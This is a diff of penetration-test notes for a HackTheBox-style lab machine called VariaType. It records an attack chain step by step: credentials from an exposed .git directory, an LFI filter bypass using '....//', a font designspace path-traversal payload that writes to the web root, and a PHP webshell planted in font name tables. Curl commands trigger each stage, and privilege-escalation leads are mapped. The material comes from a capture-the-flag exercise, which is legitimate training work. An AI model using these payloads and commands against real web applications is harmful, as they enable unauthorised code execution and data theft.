@@ -1,250 +1,140 @@
-# variatype.htb — 10.129.244.202
+# VariaType — 10.129.17.22 (previously 10.129.244.202)
 
-## Recon
+**Status:** www-data RCE achieved previously, box reset, need to re-exploit. Steve privesc still unsolved.
 
-### 10:14 — Port scan
-- 22/tcp SSH OpenSSH 9.2p1 Debian
-- 80/tcp nginx 1.22.1 → redirects to http://variatype.htb/
-- Only 2 ports. TTL=63 → Linux (Debian 12)
+## Attack Chain (Proven)
 
-### 10:15 — Web app
-- VariaType Labs — Variable Font Generator
-- Pages: /, /services, /tools/variable-font-generator
-- Upload form at /tools/variable-font-generator: accepts .designspace (XML) + .ttf/.otf masters
-- Posts to /tools/variable-font-generator/process
-- Uses fonttools/fontmake (Python) for processing
-- No auth required
-- test.variatype.htb returns 301 (different vhost exists?)
+1. **Git dump on portal** → `portal.variatype.htb/.git/` exposed → gitbot:G1tB0t_Acc3ss_2025!
+2. **Portal LFI** → `download.php?f=....//....//....//....//....//etc/passwd` (single-pass `str_replace("../","")` bypass)
+3. **Flask source read** → `/opt/variatype/app.py` via LFI
+4. **Designspace format 5.0 output path traversal** → fonttools writes variable font to arbitrary path
+5. **PHP polyglot font** → PHP code in name table survives fonttools compilation → webshell as www-data
 
-## Enumeration
+## Critical Discovery This Session: Target fonttools Lacks Path Sanitization
 
-### 10:16 — Directory brute (variatype.htb)
-- Only found: /, /services, /tools/variable-font-generator, /static/css/corporate.css
-- No hidden endpoints on main site
+**Target fonttools version** at `/usr/local/lib/python3.11/dist-packages/fontTools/varLib/__init__.py`:
 
-### 10:16 — Vhost enumeration
-- Found: **portal.variatype.htb** — Internal Validation Portal
-- Login form: username + password, POST to /
-- "Typography Integrity & Document Validation Suite"
-- Version ref: VT-VALID-2.1.4
-- IT support: it-support@variatype.internal
-- "All processing occurs locally. No external data transmission."
+```python
+# TARGET (vulnerable - NO basename protection):
+filename = vf.filename if vf.filename is not None else vf.name + ".{ext}"
+vf_name_to_output_path[vf.name] = os.path.join(output_dir, filename)
+```
 
-### 10:17 — Portal enumeration
-- **`.git` directory EXPOSED!** HEAD, config, index all accessible
-- Portal is PHP (PHPSESSID cookie)
-- /index.php — login page
-- /files/ — directory listing (301)
-- /styles.css — CSS file
-- Default creds admin:admin and admin:password → "Invalid credentials"
+```python
+# NEWER versions (patched - HAS basename protection):
+filename = os.path.basename(vf.filename)  # strips path traversal
+```
 
-### 10:18 — Git dump
-- Dumped .git from portal → only auth.php (empty USERS array in HEAD)
-- Git history (2 commits): initial implementation → "add gitbot user for automated validation pipeline"
-- **Creds in git diff: `gitbot` / `G1tB0t_Acc3ss_2025!`**
-- Commit by "Dev Team" <dev@variatype.htb>
+**Exploit mechanism:** In designspace format 5.0, `<variable-font filename="../../path/to/cmd.php">` controls the output path. On the target, this path is used AS-IS without `os.path.basename()`, allowing full path traversal AND arbitrary extension (no forced .ttf).
 
-### 10:19 — Testing creds
-- Portal login: `gitbot:G1tB0t_Acc3ss_2025!` → 302 to /dashboard.php. Works!
-- SSH: publickey only, password rejected
-- Dashboard shows "Recent font builds from the variable font generator" — no files yet
-- /files/ → 403 Forbidden
-- Portal files: index.php, auth.php, dashboard.php, styles.css
-- Dashboard is sparse — just shows generated fonts list
+## Exploit Files Ready
 
-### 10:20 — Font generator testing
-- Uploaded clean .designspace + real Roboto TTF → "Font generation failed during processing"
-- Even valid-looking uploads fail — might need exact filename match or specific format
-- OOB XXE in .designspace (entity in axis name attribute) → NO CALLBACK
-- Python's fonttools XML parser (ElementTree) doesn't process DTD entities by default
-- XXE is likely a dead end (strike 1)
+- `exploits/build_rce_font.py` — Builds two master TTFs with PHP payload in name table (trademark field)
+- `exploits/upload_rce.py` — Uploads designspace + masters to `/tools/variable-font-generator/process`
+- `exploits/TestFamily-Light.ttf` / `TestFamily-Bold.ttf` — Pre-built master fonts with `<?php system($_GET["cmd"]); ?>` in name table
+- `exploits/config.designspace` — Template designspace (needs traversal path added for upload)
 
-**Pivot: The .designspace filename attribute could be a path traversal vector.**
-**Or: fonttools processing might have a deserialization/code exec CVE.**
+### Upload designspace format (the key payload):
 
-### 10:22 — Research + XXE attempts
-- CVE-2023-45139: XXE in fonttools < 4.43.0 via XMLReader/SAX parser
-- Tried XXE in axis name attribute → no callback (strike 1)
-- Tried XXE in source familyname attribute → no callback (strike 2)
-- Tried XXE in lib/dict/string text content → no callback
-- Path traversal in source filename → same "failed during processing" error
-- **Conclusion: XXE not working. Server likely runs fonttools >= 4.43.0 (patched)**
-- **3 strikes on XXE. Moving on.**
+```xml
+<designspace format="5.0">
+  ...
+  <variable-fonts>
+    <variable-font name="TestFamilyVF" filename="../../../../../../var/www/portal.variatype.htb/public/cmd.php">
+      <axis-subsets>
+        <axis-subset name="Weight"/>
+      </axis-subsets>
+    </variable-font>
+  </variable-fonts>
+</designspace>
+```
 
-### 10:25 — Upload analysis
-- Filename traversal in upload headers accepted (no sanitization) but generation fails
-- Non-.designspace files rejected: "must be a valid .designspace document"
-- Tried path traversal in designspace source filename attr → same processing error
-- Portal dashboard still shows "No generated fonts found" after all attempts
-- Need to make a SUCCESSFUL generation to see what files appear on portal
-- Font creation locally is proving difficult with fonttools API
+### How to re-exploit:
 
-**Key insight: Portal serves files from /files/ directory. If generator writes output 
-there as a .php file, we get RCE. Need to understand the output path.**
+```bash
+# 1. Update /etc/hosts with new IP
+# 2. Login to portal for LFI cookie
+curl -s -c /tmp/cookies.txt -L -d "username=gitbot&password=G1tB0t_Acc3ss_2025!" "http://portal.variatype.htb/"
 
-### 10:28 — Font generation always fails
-- Tried DejaVu Sans (valid system TTF) + matching designspace → still fails
-- **3 strikes on font generation.** Every upload fails with same error.
-- Maybe that's by design — the exploit might not require successful generation
-- The uploaded file might still be written to disk even if processing fails
+# 3. Run upload script (update IP in /etc/hosts first)
+cd /htb/machines/box2/exploits && python3 upload_rce.py
 
-### 10:30 — Back to portal
-- Git only contains auth.php — dashboard.php, index.php not in repo
-- No LFI via query params on dashboard.php
-- No PHP source disclosure
-- Need to look harder at what the portal does with generated fonts
+# 4. If upload script fails, use curl directly:
+curl -X POST "http://variatype.htb/tools/variable-font-generator/process" \
+  -F "designspace=@rce.designspace;filename=config.designspace" \
+  -F "masters=@TestFamily-Light.ttf" \
+  -F "masters=@TestFamily-Bold.ttf"
 
-### 10:31 — Exhaustive font generator testing
-- Tried DejaVu Sans with exact matching familyname/stylename → fails
-- Tried absolute paths to system fonts → fails
-- Tried format 5.0 designspace → fails
-- Tried PHP webshell as .ttf → accepted but generation fails
-- Non-.ttf/.otf masters rejected: "Only .ttf and .otf master fonts are supported"
-- Portal dashboard never shows generated fonts
-- No additional endpoints found on main site
-- No SQLi on portal login (hardcoded array auth)
-- SSH is key-only auth
+# 5. Test webshell
+curl "http://portal.variatype.htb/cmd.php?cmd=id"
+```
 
-**STOP. 3+ strikes on font generation. Something fundamental is different 
-about how this works. I need to SURVEY what I'm missing, not keep trying variations.**
+## Post-Shell Survey (from previous session)
 
-**What am I missing?**
-- Maybe there's a queue/job system and results appear later?
-- Maybe the output goes to a DIFFERENT subdomain?
-- Maybe I need to check the PORTAL source more carefully
-- Maybe the exploit is in the .designspace XML processing, not font generation
+### System Info
+- OS: Debian 12 (bookworm), kernel 6.1.0-43-amd64
+- SSH: OpenSSH 9.2p1 (key-only auth)
+- HTTP: nginx 1.22.1, PHP 8.2, Flask on port 5000
 
-### 10:35 — More dead ends
-- XInclude in designspace → no callback
-- FamilyName path traversal → no output files
-- Guessed filenames in portal /files/ → all 404
-- No files in /uploads/, /output/, /generated/ on main site
-- The font generator NEVER produces output (at least none visible to us)
+### Users
+- **steve** (uid 1000) — target for privesc, runs font processing cron
+- **www-data** — current shell
+- **variatype** (uid 102, group www-data) — service user
 
-**CRITICAL QUESTION: Am I even looking at the right vulnerability?**
-- Maybe the font generator is a distraction
-- Maybe the entry point is through the PORTAL, not the generator
-- Maybe I need to enumerate MORE subdomains
-- Maybe there's a way to register/create an account on the portal
+### Steve's Cron Job
+- Runs `/home/steve/bin/process_client_submissions.sh`
+- Processes fonts from `/var/www/portal.variatype.htb/public/files/`
+- Iterates: `*.ttf *.otf *.woff *.woff2 *.zip *.tar *.tar.gz *.sfd`
+- Executes: `fontforge -lang=py -c "...font = fontforge.open('$file')..."`
+- fontforge version: 20230101, built 2025-12-07 from commit a1dad3e
+- Full source at `/usr/local/src/fontforge/`
 
-### 10:38 — Complete re-survey  
-- No additional subdomains (bigger wordlist confirmed only 'portal')
-- No hidden endpoints on main site
-- No parameter-based vulns on portal dashboard
-- SSTI in designspace familyname → not reflected in error
-- Command injection via upload filename → no OOB callback
-- Command injection via designspace axis name → no OOB callback
-- Small compatible font subset (80 glyphs) still fails processing
-- Single master still fails processing
-- **The font generation is ALWAYS broken on the server side**
+### Root Privesc (Mapped, Requires Steve First)
+- `/opt/font-tools/install_validator.py` → setuptools PackageIndex RCE
+- Need steve access before this can be exploited
 
-**I'm stuck. Need to think about what I'm fundamentally missing.
-Possible I need to look at this from a completely different angle.
-Maybe the exploit isn't through the web at all — maybe the gitbot 
-creds or the git repo contain more info I haven't found.**
+## www-data → steve: Dead Ends
 
-### 10:42 — Found download.php and view.php!
-- Background feroxbuster with bigger wordlist found: **download.php** and **view.php**
-- view.php takes ?file= parameter, validates: must contain [something] (non-empty brackets)
-- Path traversal (../) is ALLOWED in the filename!
-- Any extension accepted (.ttf, .php, .txt)
-- Empty brackets [] are rejected
-- download.php always says "File parameter required" regardless of method
-- view.php returns empty for files that don't exist (vs "Invalid file name" for bad format)
+1. **Python CWD module hijack** — DEAD. System `/usr/lib/python3.11/sitecustomize.py` shadows CWD modules. fontforge's Py_Initialize() never loads from CWD.
+2. **SFD PickledData deserialization** — DEAD. fonttools stores as raw string, `pickle.loads()` only on explicit `font.persistent` access (steve's script never does this).
+3. **SFD system() injection** — DEAD. `system()` in sfd.c:3332 is in SAVE function (compression), not LOAD. Not triggered by `fontforge.open()`.
+4. **Filename injection** — DEAD. Regex filter `^[a-zA-Z0-9._-]+$` blocks all special chars.
+5. **XXE in .designspace** — DEAD. fonttools uses safe parser.
 
-**Challenge:** Need actual files with brackets to exist on disk.
-Variable font output format: FamilyName[axis].ttf
-But font generation never succeeds so no files exist.
+## www-data → steve: Unexplored Angles
 
-### 10:50 — CORRECTION: bracket bypass was false positive!
-- All earlier "accepted" responses were CURL GLOBBING artifacts!
-- curl without -g interprets [wght] as character range (w,g,h,t)
-- With -g flag (correct), view.php rejects EVERYTHING as "Invalid file name"
-- view.php accepts NO inputs at all — maybe it only works when files exist
-- download.php always says "File parameter required" regardless of method
-- UUIDs, hashes, numbers all rejected by view.php
+### 1. SFD Parser Deep Review (HIGHEST PRIORITY)
+- `/usr/local/src/fontforge/sfd.c` — ~6000 lines of C code
+- Need to trace ALL code paths triggered by `fontforge.open()` on SFD files
+- Look for: exec, system, popen, Python callouts, deserialization in LOAD path
+- Previous review only checked PickledData, system(), and Script fields
 
-**Need to find what format view.php actually accepts, or make files 
-available so the dashboard shows them (and reveals the format).**
+### 2. fontforge pyhook/ Directory
+- `/usr/local/src/fontforge/pyhook/` exists but unexplored
+- May auto-load Python scripts from discoverable paths
+- Test: can we place a hook in `/files/pyhook/` that gets loaded?
+- Risk: likely blocked by same sitecustomize shadowing issue
 
-### 10:55 — BREAKTHROUGH: Font generation SUCCESS!
-- Local build with fonttools varLib.build() revealed the issue: OS/2 table version 1 missing sCapHeight
-- Fixed the font (set OS/2 version to 4, added sCapHeight/sxHeight)
-- Uploaded fixed font → **SUCCESS!** "Your variable font is ready."
-- Download link: `/download/vtusBYgZWgQ` (short base64-ish token)
-- File identifiers are NOT filenames, they're SHORT TOKENS
+### 3. fontforge CVEs for Version 20230101
+- Research CVEs affecting this specific version
+- Crafted font → buffer overflow → code execution during open()
+- Check NVD, fontforge GitHub issues, security advisories
 
-### 10:56 — Font generation SUCCESS + LFI CONFIRMED
-- Fixed font: OS/2 table version 1→4, added sCapHeight/sxHeight
-- Uploaded → SUCCESS! Token: vtusBYgZWgQ, download: /download/vtusBYgZWgQ
-- Portal dashboard now shows files as: variabype_<token>.ttf
-- Portal params are **`f=`** NOT `file=` (wasted time with wrong param!)
-- **LFI in download.php!** Uses `str_replace("../", "", $file)` — single pass
-- Bypass: `....//` → after replace → `../`
-- Traversal at depth 5: `....//....//....//....//....//etc/passwd` works!
-- Read view.php + download.php source code
-- User: **steve** (uid 1000, /home/steve, /bin/bash)
-- Files dir: /var/www/portal.variatype.htb/public/files/
+## Credentials
 
-### Credentials
-- gitbot:G1tB0t_Acc3ss_2025! (portal)
+| User | Password | Source |
+|------|----------|--------|
+| gitbot | G1tB0t_Acc3ss_2025! | .git history on portal |
+| Flask SECRET_KEY | 7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371 | /opt/variatype/app.py |
 
-### 11:22 — Reading files via LFI
-- Read /etc/passwd → user: **steve** (uid 1000)
-- Read nginx configs: Flask at 127.0.0.1:5000, portal at /var/www/portal.variatype.htb/public
-- **Read Flask app.py at /opt/variatype/app.py** — FULL SOURCE!
-- Read view.php and download.php source
+## Key File Locations on Target
 
-### Flask app.py key findings:
-- Masters saved with ORIGINAL filename: `os.path.join(workdir, font.filename)` — **PATH TRAVERSAL!**
-- designspace saved as hardcoded 'config.designspace'  
-- Processing: `subprocess.run(['fonttools', 'varLib', 'config.designspace'], cwd=workdir)`
-- Output goes to: `/var/www/portal.variatype.htb/public/files/variabype_<token>.ttf`
-- Extension check: `font.filename.endswith(('.ttf', '.otf'))` — MUST end with .ttf/.otf
-
-### download.php source:
-- `str_replace("../", "", $file)` — single pass, bypassed with `....//`
-- Reads from `/var/www/portal.variatype.htb/public/files/`
-- Serves with readfile() (no PHP execution)
-
-### 11:25 — Exploiting path traversal write
-- Can write .ttf/.otf files to ARBITRARY paths via master filename traversal
-- Wrote PHP webshell as cmd.php.ttf to portal public dir → file exists but nginx won't execute .php.ttf
-- PHP path_info exploit (cgi.fix_pathinfo) → 404
-- Can't write non-.ttf files (extension check)
-- PHP 8.2
-
-### 11:30 — Extension bypass attempts
-- Tried: null byte, tab in filename, RFC 5987 filename*, filename vs filename* differential
-- ALL blocked by Python's endswith('.ttf', '.otf') check
-- Werkzeug uses filename* when present (RFC 6266), no parsing differential
-- nginx fastcgi config has try_files → blocks path_info exploit
-- Can't write .php, .ini, .conf, .py files — ONLY .ttf/.otf
-
-### Current blocker: can write arbitrary .ttf files anywhere, need code execution path
-### 11:40 — SSTI FOUND IN FLASK TEMPLATE!
-- Read /opt/variatype/templates/tools/variable_font_generator.html
-- Flash messages rendered with `{{ message|safe }}` — NO ESCAPING!
-- Flash messages come from the error/success paths in the Flask app
-- The flash content comes from hardcoded strings... BUT:
-  - `flash('Font generation failed during processing.', 'error')` — hardcoded
-  - HOWEVER: what if we can inject into the flash through the designspace/font?
-  - The only user-controlled flash is: `flash('Only .ttf and .otf master fonts are supported.', 'error')`
-  - That's also hardcoded. ALL flash messages are hardcoded strings.
-  - **Wait — the exception handlers catch generic exceptions. If fonttools 
-    raises an error with user-controlled content in the message...**
-  - Actually no, CalledProcessError just says the command failed.
-  
-**SSTI might not be exploitable unless we can control flash content.
-Need to check if any error message includes user input.**
-
-### 11:42 — Enumerate more system files via LFI  
-- /etc/shadow: Content-Length=798 but 0 bytes readable (stat works, read doesn't)
-- Fuzzed /opt/, /home/steve/ with seclists — nothing readable beyond what we already have
-- www-data can read: /etc/passwd, /etc/group, /etc/hosts, nginx configs, PHP configs, 
-  Flask app source + templates, portal PHP source, systemd service files, /etc/fstab
-- www-data CANNOT read: /home/steve/*, /etc/shadow content, /root/*
-- SSTI in variable_font_generator.html: `{{ message|safe }}` — but |safe only skips 
-  HTML escaping, doesn't re-evaluate Jinja2 templates. NOT exploitable for SSTI.
-
-### Still need: a way to turn .ttf file write into code execution
+- Flask app: `/opt/variatype/app.py`
+- Portal webroot: `/var/www/portal.variatype.htb/public/`
+- Portal files dir: `/var/www/portal.variatype.htb/public/files/` (writable by www-data)
+- Steve's script backup: `/opt/process_client_submissions.bak`
+- Root privesc script: `/opt/font-tools/install_validator.py`
+- fontforge source: `/usr/local/src/fontforge/`
+- fonttools varLib: `/usr/local/lib/python3.11/dist-packages/fontTools/varLib/__init__.py`
+- nginx portal config: `/etc/nginx/sites-enabled/portal.variatype.htb`
+- nginx main config: `/etc/nginx/sites-enabled/variatype.htb`
